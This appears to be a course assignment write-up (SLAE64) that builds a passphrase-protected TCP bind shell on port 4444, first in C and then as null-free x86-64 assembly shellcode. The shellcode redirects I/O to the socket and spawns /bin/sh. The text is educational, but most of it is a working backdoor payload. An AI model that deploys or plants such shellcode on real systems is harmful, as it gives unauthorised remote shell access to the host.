After completing the video lectures of the Security Tube Linux 64 bit Assembler Expert course (SLAE64), a series of assessments must be completed to gain certification. The first assignment is to create a shellcode string that will start a TCP Bind Shell. 

A bind shell listens on a network port and waits for an incoming connection. When a connection is received, a new socket is created, the I/O streams of the host are cloned into this new socket and a new shell instance is spawned.

This has the effect of giving the remote user an interactive shell on the host system. Of course this is not as secure as something like an SSH connection, but is quite sufficient to let a remote user poke around the host system, issue commands and exfiltrate data.

As an extra twist, the assignment requires a little more security; a passphrase must be implemented in the bind shell code to prevent anyone who happens to stumble across the listening socket from simply dropping into the host shell.

Of course, this 'security' is limited and anyone eavesdropping on the connection could sniff the passphrase with minimal effort, but it is an interesting exercise.

## High Level Proof of Concept

Vivek provided a rough outline of the code in C during the course and this was taken as a base for this assignment.

The full listing of my version of the code is hosted on GitHub: [Bind_Shell.c](https://github.com/CodeheadUK/SLAE64/blob/master/src/bind_shell.c).

The basic sections of code are:

### Variable Definitions and Initialisation

{{< highlight c >}}
// Socket descriptors
int svr_sock;
int client_sock;

// Socket definitions
struct sockaddr_in server;
struct sockaddr_in client;
int sockaddr_len = sizeof(struct sockaddr_in);

// Some strings
char *arguments[] = { "/bin/sh", 0 };
char *in[] = { "xxxxxxxxxx", 0 };
bzero(&in, 10);

// Loop flag
int connected = 0;
{{</ highlight >}}

The first two variables are descriptors which will hold the identifiers for the sockets we'll create later.

The <tt>sockaddr_in</tt> structures are used to define the socket configurations. We'll populate the <tt>server</tt> configuration manually in the next step, but the <tt>client</tt> structure will be generated for us when we accept an incoming connection.

Lastly, we define a couple of string buffers that we'll need later and a flag to control the authentication loop. The buffer definitions are a bit odd, but we don't want to worry about memory allocation here and will handle these strings differently in the assembly language anyway.

### Server Socket Initialisation

The server <tt>sockaddr_in</tt> structure is configured as an IPv4 port, listening on port 4444 of all IP interfaces (0.0.0.0).

{{< highlight c >}}
// Populate the server port information
server.sin_family = AF_INET;         // AF_INET = 2
server.sin_port = htons(4444);
server.sin_addr.s_addr = INADDR_ANY; // INADDR_ANY = 0
bzero(&server.sin_zero, 8);
{{</ highlight >}}

Next, we create a TCP socket, bind it using the <tt>server</tt> configuration and start listening on the port.

{{< highlight c >}}
// Create the server socket
if((svr_sock = socket(AF_INET, SOCK_STREAM,  0 )) == -1) // SOCK_STREAM = 1
{
    perror("Server socket: ");
    exit(-1);
}

// Bind the port
if((bind(svr_sock, (struct sockaddr *)&server, sockaddr_len)) == -1)
{
    perror("Bind: ");
    exit(-1);
}

// Start listening for incoming connections
if((listen(svr_sock, 2)) == -1)
{
    perror("Listen: ");
    exit(-1);
}
{{</ highlight >}}

I have included the numeric values of the various constants as comments in the code above to make the conversion to assembler easier later. These values can either be gleaned from the source code, the documentation or dumped from Python:

{{< highlight text >}}
MBP:slae64$ python
Python 2.7.12 (default, Jun 29 2016, 14:05:02)
Type "help", "copyright", "credits" or "license" for more information.
>>> import socket
>>> print socket.AF_INET
2 
{{</ highlight >}}

### Accept and validate incoming connections

To carry out passphrase validation, we'll set up a loop that accepts incoming connections, prompts for input and checks any received data against the pre-set password until it receives the correct passphrase.

{{< highlight c >}}
// Start of authentication loop
do
{
    // Accept a request and spawn a new socket for the connection
    if((client_sock = accept(svr_sock, (struct sockaddr *)&client, &sockaddr_len)) == -1)
    {
        perror("Accept: ");
        exit(-1);   
    }
{{</ highlight >}}

This code accepts the connection and retains the newly spawned socket that the remote user is connected to.

We now send a message down the new socket to request the secret passphrase from the connecting user. Any received data is placed in the <tt>in</tt> array.

{{< highlight c >}}
    // Request a passphrase
    send(client_sock, (char*)"Speak Friend and Enter: ", 24, 0);
    read(client_sock, &in, 10);
{{</ highlight >}}

A bad passphrase results in the new socket being closed and the system going back to listening. Input data is limited by the length value in the read call. However, we have to zero out the input buffer after a failed attempt as there many be leftover data which could interfere with the next pass.

{{< highlight c >}}
    // Validate the passphrase
    if(strcmp(&in, "password\n") != 0)
    {
        // Reject bad passphrase and reset for next connection
        send(client_sock, (char*)"Goodbye\n", 8, 0);
        close(client_sock);
        printf("Auth fail: %s\n", (char*)in);
        bzero(&in, 10);
    }
{{</ highlight >}}

If we get a good passphrase, we can break out of the authentication loop.

{{< highlight c >}}
    else
    {   
        // Break out of the loop when passphrase is good 
        send(client_sock, (char*)"Welcome\n", 8, 0);
        connected = 1;
        printf("Auth Passed!\n");
    }
}while(connected == 0);
{{</ highlight >}}

### Spawning the new shell

Once we have authenticated our incoming connection, so we can kill off the server socket as it is no longer required. Then all that remains is to clone the I/O streams into the new socket and spawn the shell.

{{< highlight c >}}
// Kill the server socket
close(svr_sock);

// Redirect file descriptors to new socket
dup2(client_sock, 0); // STDIN
dup2(client_sock, 1); // STDOUT
dup2(client_sock, 2); // STDERR

// Start a shell
execve(arguments[0], &arguments[0], NULL);
{{</ highlight >}}

Note that the <tt>execve</tt> function call requires a reference to the <tt>'/bin/sh'</tt> string and an array of parameters which contains the <tt>'/bin/sh'</tt> string. Keeping this structure small requires some interesting memory gymnastics which explain the odd definitions in the C code.

With that, we have completed the required functionality of the bind shell in C. Now we have the fun task of converting these operations to Assembler.

## Translating the code to Assembler

### Establishing variable storage requirements

There are quite a few variables and structures to deal with in this code. Some values are pointers that require addressable locations and the number of basic variables that we need to persist makes juggling registers to avoid syscall clobbering a burden.

Reviewing the C code, it seems that we need to persist at least 3 integer variables (<tt>svr_sock</tt>, <tt>client_sock</tt> and <tt>sockaddr_len</tt>). We also need buffers for the <tt>sockaddr_in</tt> structures, the user input and the <tt>execve</tt> arguments.

The <tt>sockaddr_in</tt> structure is described in <tt>netinet/in.h</tt>

{{< highlight c >}}
struct sockaddr_in {
    short            sin_family;   // 2 Bytes. e.g. AF_INET (2)
    unsigned short   sin_port;     // 2 Bytes. Network order.
    struct in_addr   sin_addr;     // see struct in_addr, below
    char             sin_zero[8];  // Zero padding. 8 bytes.
};

struct in_addr {
    unsigned long s_addr;  // 4 bytes.
};
{{</ highlight >}}

This totals 16 bytes. However, we don't really need two instances of this, we can re-use the same location for both sockets.

The <tt>execve</tt> call requires a <tt>'/bin/sh'</tt> string and an argument array containing at least two address references. As we're using 64-bit assembly, the default size of addresses is 64 bits, or 8 bytes. So we can fit all our strings, structures and arrays nicely in two 16 byte buffers.

The stack provides a good stable solution to the storage problem. I came up with the following layout to meet the requirements of this code: 

![image](img/StackBuffer.png)

Although the stack is often said to grow 'downwards' in memory, it is often easier to visualise it growing upwards as it makes the layout of structures and buffers more logical and simplifies the view of offsets.

Buffer 1 will be used for the server and client structures as well as the input string from the user. The socket variables are fixed and buffer 2 will be used for the <tt>execve</tt> parameter array. 

I found that having a decent sketch of the stack layout and offsets makes writing and reading back the assembly language much easier.

### Setting up

The first thing to do is set RBP to the base of the stack so that the offsets in the layout sketch are correct.

Next we'll use the Jump, Call, Pop method to establish the location of the embedded strings. Through trial and error I found that register <tt>R15</tt> was not clobbered by any of the syscalls, so that serves as a placeholder for the string reference address. 

{{< highlight asm >}}
global _start
section .text

_start:
    mov rbp, rsp        ; Get a reference to the base of the stack
    jmp short _strdata  ; Find address of string list

_getref:                ; Keep reference to strings
    pop r15
    jmp _main

_strdata:
    call _getref        ; call pushes RIP onto stack
    prompt: db "Speak friend and enter: "
    pass:   db "password", 0xa
    good:   db "Welcome", 0xa
    bad:    db "Wrong", 0xa
{{</ highlight >}}

### Utility functions

Next in the code are a couple of utility functions. These two methods are used multiple times throughout the listing and it makes sense to break them out as a functions rather than repeat the code multiple times. The first, <tt>_exit</tt>, restores the stack pointer and stops the code cleanly. The second, <tt>_prompt</tt>, sends strings to the remote client through their socket. I won't go into detail, but these methods are located at the start of the listing so that subsequent <tt>call</tt> instructions will have a negative offset with no troublesome zeros.

{{< highlight asm >}}
_exit:                  ; exit nicely
    xor rax, rax
    push rax
    pop rbx
    add rax, 0x3c
    add rbx, 1
    mov rsp, rbp
    syscall 

_prompt:                ; send string to a socket, RSI and RDX populated before call    
    mov rdi, [rbp-40]
    xor rax, rax
    push rax            ; push/pop has less instructions than mov for the lower registers
    push rax    
    pop rcx
    pop r8
    mov r9, r8          ; mov is more efficient for r8 - r15
    add rax, 44         ; sys_sendto
    syscall
    ret
{{</ highlight >}}

### Creating the server socket

The first item in our variable stack is the 16 byte buffer containing the <tt>sockaddr_in</tt> structure. We know the values from the C example and we have to build the structure bottom up and right to left as shown:

![image](img/sockaddr_in.png)

There are quite a few zeros in there. However, we can clear RAX with the XOR trick. Pushing RAX gives us the <tt>sin_zero</tt> entry. Then we can populate the remaining values with add and shift operations.

{{< highlight asm >}}
_main:

; Build a server sockaddr_in struct on the stack
    xor rax, rax
    push rax
    add ax, 0x5c11
    shl rax, 16
    add ax, 2
    push rax
{{</ highlight >}}

To create the socket, we use the <tt>socket</tt> syscall which matches the <tt>socket()</tt> function used in the C code:

 ID | Name                | Arg1                | Arg2              | Arg3
:---|:--------------------|:--------------------|:------------------|:---------------------
 41 | <tt>sys_socket</tt> | <tt>int family</tt> | <tt>int type</tt> | <tt>int protocol</tt> 


Having done some 32-bit assembler, I was used to calling functions with the arguments on the stack. However, in AMD64 code, the arguments are passed in registers.

The order is as follows:

Argument | Arg1 | Arg2 | Arg3 | Arg4 | Arg5 | Arg6
---------|:----:|:----:|:----:|:----:|:----:|:-----:
Register | RDI  | RSI  | RDX  | RCX  |R8    | R9

Return values are still found in RAX.

Unsurprisingly, Microsoft uses a different method. The various register schemes are listed on the [x86-64 Wiki Page](https://en.wikipedia.org/wiki/X86_calling_conventions#x86-64_calling_conventions).

Another difference from x86 assembler is that we no longer trigger interrupt 0x80 for syscalls. The selection method remains the same, with the syscall number being placed in <tt>RAX</tt>, but there is now a dedicated <tt>syscall</tt> instruction. 

So, to invoke the <tt>socket</tt> syscall (ID: 41), we place 2 in <tt>RDI</tt>, 1 in <tt>RSI</tt>, 0 in <tt>RDX</tt>, 41 in <tt>RAX</tt> and then invoke the <tt>syscall</tt> instruction. 

Of course, it isn't that simple if we want to keep zeros out of the shellcode, but as long as we avoid direct <tt>mov</tt> instructions and stick to increments and adds, we can easily generate the required values.

{{< highlight asm >}}
; Create socket
    xor rax, rax
    mov rdx, rax
    inc rax
    mov rsi, rax        ; SOCK_STREAM (1)
    inc rax
    mov rdi, rax        ; AF_INET (2)
    add rax, 39         ; syscall 41
    syscall
    cmp rax, -1         ; exit on error
    jle _exit
    push rax            ; store socket id on stack
{{</ highlight >}}

If the return value is -1 or less, something bad has happened and we call the <tt>_exit</tt> handler. Otherwise, <tt>RAX</tt> contains the newly created socket id which we push onto the stack to create the first of our fixed variable entries.

Next we bind our server socket. Again the <tt>bind</tt> syscall matches the <tt>bind()</tt> function:

 ID /RAX | Name              | Arg1 / RDI      | Arg2 / RSI                       | Arg3 / RDX
:--------|:------------------|:----------------|:---------------------------------|:--------------------
 49      | <tt>sys_bind</tt> | <tt>int fd</tt> | <tt>struct sockaddr *myaddr</tt> | <tt>int addrlen</tt> 

Now we begin to reference the stack variables using an offset from <tt>RBP</tt>. The socket ID and a reference to our populated <tt>sockaddr</tt> structure can dropped directly into the relevant registers. 
We need a static value of 16 representing the length of <tt>sockaddr</tt> for the third argument. As we'll be needing a reference to this later, we'll push it onto the stack as the second fixed variable once we have generated the value.

{{< highlight asm >}}
; Bind Socket
    xor rax, rax
    add rax, 49
    mov rdi, [rbp-24]   ; socket id
    lea rsi, [rbp-16]   ; sockaddr_in struct
    xor rdx, rdx
    add rdx, 16         ; sockaddr_in size
    push rdx            ; create size val ref on stack
    syscall
    cmp rax, -1
    jle _exit
{{</ highlight >}}

Once again, a value of -1 or below indicates an error. 

Placing the socket in listen mode is much the same as the previous syscalls. The method name and arguments are the same as the C code:

ID / RAX | Name                | Arg1 / RDI      | Arg2 / RSI
:--------|:--------------------|:----------------|:-----------
50       | <tt>sys_listen</tt> | <tt>int fd</tt> | <tt>int backlog</tt>

<tt>RDI</tt> still contains the socket ID from the previous syscall, so it is just a case of setting the method ID and limiting the number of connections to two.

{{< highlight asm >}}
; Listen
    xor rax, rax
    add rax, 2
    mov rsi, rax
    add rax, 48
    syscall
    cmp rax, -1
    jle _exit
{{</ highlight >}}

### Accepting and validating incoming connections

The <tt>accept</tt> syscall matches the function in the C code:

 ID / RAX | Name                | Arg1 / RDI      | Arg2 / RSI                               | Arg3 / RDX
:---------|:--------------------|:----------------|:-----------------------------------------|:---------------------------
 43       | <tt>sys_accept</tt> | <tt>int fd</tt> | <tt>struct sockaddr *upeer_sockaddr</tt> | <tt>int *upeer_addrlen</tt>

We're reusing the <tt>sockaddr</tt> buffer on the stack. I expected this buffer to need zeroing out, but tests showed that the code worked just fine with a dirty buffer, so I didn't waste instructions clearing the area.

As previously mentioned, the third argument is a pointer to the <tt>sockaddr</tt> length value. The <tt>accept</tt> syscall may adjust this value, so we cannot simply pass a constant value or reference a register. Doing so will cause <tt>accept</tt> to fail when an incoming connection is acquired. 

{{< highlight asm >}}
_accept:
    xor rax, rax
    add rax, 43
    mov rdi, [rbp-24]   ; socket id
    lea rsi, [rbp-16]   ; sockaddr_in struct
    lea rdx, [rbp-32]   ; pointer to sockaddr_in size
    syscall
    cmp rax, -1
    jle _exit

    push rax        ; Store client socket id
{{</ highlight >}}

Note that the <tt>_accept</tt> name here is a label rather than a comment. This is the point we will loop back to if the connecting user does not pass the passphrase check.

As we may be returning here from further down the code, we cannot depend on the state of the registers and we must populate all the values.

The code blocks at this point, waiting for connections. The error check is carried out as normal, but if we do have a valid socket ID, it is pushed onto the stack for safe keeping.

Assuming that we have a valid socket, we need to prompt the remote user for a password. In the C code, the <tt>send()</tt> function was used for this. However, I could not find a matching syscall in the kernel documentation. The nearest syscall was <tt>sys_sendto</tt> which required extra parameters:

 ID / RAX | Name | Arg1 / RDI | Arg2 / RSI | Arg3 / RDX | Arg4 / RCX | Arg5 / R8 | Arg6 / R9 
:---------|:-----|:-----------|:-----------|:-----------|:-----------|:----------|:---------
44|<tt>sys_sendto</tt>|<tt>int fd</tt>|<tt>void *buff</tt>|<tt>size_t len</tt>|<tt>unsigned flags</tt>|<tt>struct sockaddr *addr</tt>|<tt>int addr_len</tt>

Digging a little further, I found the following snippet in <tt>net/socket.c</tt>:

{{< highlight c >}}
SYSCALL_DEFINE4(send, int, fd, void __user *, buff, size_t, len,
        unsigned, flags)
{
    return sys_sendto(fd, buff, len, flags, NULL, 0);
}
{{</ highlight >}}

This tells us that we can simply ignore the extra parameters and we know from the C code that the flag argument can also be zero.

As discussed earlier, we need to use this call in a few places during execution, so <tt>sendto</tt> is wrapped in the utility stubs at the start of the listing. The calling code simply needs to set the string address and length registers.

{{< highlight asm >}}
; authenticate incoming connection
    mov rsi, r15        ; string address
    xor rdx, rdx
    add rdx, 24         ; string length
    call _prompt
{{</ highlight >}}

To get the input from the remote user in the C code, we used <tt>read()</tt>. I could not find a <tt>read</tt> syscall, but <tt>recvfrom</tt> seemed to have a similar setup to the <tt>sendto</tt> method:

 ID / RAX | Name | Arg1 / RDI | Arg2 / RSI | Arg3 / RDX | Arg4 / RCX | Arg5 / R8 | Arg6 / R9 
:---------|:-----|:-----------|:-----------|:-----------|:-----------|:----------|:---------
45|<tt>sys_recvfrom</tt>|<tt>int fd</tt>|<tt>void *ubuf</tt>|<tt>size_t size</tt>|<tt>unsigned flags</tt>|<tt>struct sockaddr *addr</tt>|<tt>int *addr_len</tt>

A quick test showed that the same pattern of zeroing out the later parameters could be used:

{{< highlight asm >}}
    mov rdi, [rbp-40]   ; socket id
    lea rsi, [rbp-16]   ; buffer address
    xor rcx, rcx        ; Zero out registers
    push rcx
    push rcx
    push rcx
    pop rdx
    pop rax
    pop r8
    mov r9, r8  
    add rdx, 8          ; buffer length
    add rax, 45         ; recvfrom
    syscall
{{</ highlight >}}

Interestingly, I found that the <tt>push</tt> and <tt>pop</tt> instructions on the <tt>RAX</tt>, <tt>RBX</tt>, <tt>RCX</tt>, <tt>RSI</tt> and <tt>RDI</tt> registers are single byte instructions, while a <tt>mov</tt> is three. So <tt>push</tt>/<tt>pop</tt> saves one byte per move when working with repeating values. Unfortunately, the numbered registers (<tt>R8</tt>, <tt>R9</tt>, etc) require two bytes for each <tt>push</tt> and <tt>pop</tt> so a <tt>mov</tt> is more efficient.

The <tt>recvfrom</tt> call blocks until something is received from the remote user. 

In the C code, we used <tt>strcmp()</tt> to compare the pre-set password with the user's response. There is no nice easy syscall equivalent of <tt>strcmp</tt>, but there is a mechanism for comparing memory locations byte by byte using the <tt>cmpsb</tt> instruction.

First we set the <tt>RSI</tt> and <tt>RDI</tt> registers up with the start address of the two strings. <tt>RCX</tt> is populated with the length of the target string.

{{< highlight asm >}}
; compare strings
    lea rsi, [rbp-16]   ; input buffer address
    lea rdi, [r15+24]   ; password string address
    xor rcx, rcx
    add rcx, 8          ; length
{{</ highlight >}}

<tt>cmpsb</tt> compares the bytes at <tt>RSI</tt> and <tt>RDI</tt>, clearing the zero flag if there is a mismatch. The command handily increments the string pointers too, so we simply need to check for failed matches and loop until we have processed <tt>RCX</tt> bytes.

{{< highlight asm >}}
_cmploop:
    cmpsb               ; compare bytes
    jne _badpw          ; exit if no match
    loop _cmploop       ; next char
{{</ highlight >}}

If the two strings match, we'll fall through the the 'good passphrase' section, which sends a welcome message to the remote user and jumps to the shell setup code.

{{< highlight asm >}}
; good passphrase (fallthrough)
    lea rsi, [r15+32]   ; welcome string
    xor rdx, rdx
    add rdx, 8          ; welcome length
    call _prompt
    jmp _create_shell   ; set up the shell
{{</ highlight >}}

However, if the strings don't match, we're jumped to the <tt>_badpw</tt> location. This code sends a fail message to the remote user, pops the socket ID off the stack and uses the <tt>shutdown</tt> syscall to terminate the connection.

 ID / RAX | Name | Arg1 / RDI | Arg2 / RSI 
:---------|:-----|:-----------|:-----------
48 | <tt>sys_shutdown</tt> | <tt>int fd</tt> | <tt>int how</tt> 

The 'how' parameter is set to <tt>SHUT_RDWR</tt> which kills all read and write operations to the socket.

The last step is to loop back to the <tt>_accept</tt> label to listen for another incoming connection and repeat the validation until it is done correctly. 

{{< highlight asm >}}
_badpw:
    lea rsi, [r15+40]   ; fail message
    xor rdx, rdx
    add rdx, 6          ; fail length
    call _prompt
    xor rax, rax        ; zero out regs
    push rax
    pop rsi
    add rax, 48         ; shutdown client socket
    pop rdi             ; last use of client sock id
    add rsi, 2          ; SHUT_RDWR
    syscall     
    jmp _accept         ; jump back to await another connection
{{</ highlight >}}

Assuming that we have validated the user, the remainder of the code is concerned with setting up the shell. First we duplicate the I/O streams of the host and assign them to the client socket using <tt>dup2</tt>:

 ID / RAX | Name | Arg1 / RDI | Arg2 / RSI 
:---------|:-----|:-----------|:-----------
33 | <tt>sys_dup2</tt> | <tt>unsigned int oldfd</tt> | <tt>unsigned int newfd</tt>

{{< highlight asm >}}
_create_shell:

; Duplicate I/O descriptors
    xor rax, rax 
    add rax, 33         ; dup2      
    mov r8, rax         ; preserve syscall id for subsequent calls
    mov rdi, [rbp-40]   ; socket id
    xor rsi, rsi        ; STDIN
    syscall 

    mov rax, r8         ; dup2
    inc rsi             ; STDOUT
    syscall

    mov rax, r8         ; dup2
    inc rsi             ; STDERR
    syscall

The only remaining step is to invoke the new shell. As in the C code, we use <tt>execve</tt> for this:

 ID / RAX | Name | Arg1 / RDI | Arg2 / RSI | Arg3 / RDX  
:---------|:-----|:-----------|:-----------|:-----------
59 |<tt>sys_execve</tt>|<tt>const char *filename</tt>|<tt>const char *const argv[]</tt>|<tt>const char *const envp[]</tt>       

The '<tt>/bin/sh</tt>' string is 7 bytes, adding a NULL terminator brings us to a nice round 8 bytes. We can represent this string as a hex number, but we need to avoid introducing a zero into our shellcode. My workaround is to create the string with a leading 'X'. Right shifting the register removes the 'X' and introduces the required NULL.

We are re-using buffer 1 on the stack to hold our string. We build the arguments array in reverse by pushing a NULL onto the stack followed by the address of buffer 1.

The stack will look like this:

![image](img/StackBuffer-execve.png)

Once the stack is arranged, <tt>RDI</tt> will hold the <tt>RBP-16</tt> address, <tt>RSI</tt> will hold the <tt>RSP</tt> address.

If we've done everything right, calling the <tt>execve</tt> syscall spawns the shell and we're done. The code blocks while the remote user interacts with the local shell. Once the shell closes, the code calls the <tt>_exit</tt> stub and the program ends.

_spawn:
    xor rax, rax
    push rax
    pop rdx             
    mov rbx, 0x68732f6e69622f78 ; build 'X/bin/sh'
    shr rbx, 8          ; shift the ¨X¨ and append a NULL
    mov [rbp-16], rbx   ; copy ¨/bin/sh¨ string to buffer
    lea rdi, [rbp-16]   ; get the /bin/sh string
    push rax            ; build args array, by pushing NULL
    push rdi            ; then push buffer 1 address
    mov rsi, rsp        ; arg array address
    add rax, 59         ; execve
    syscall
    call _exit
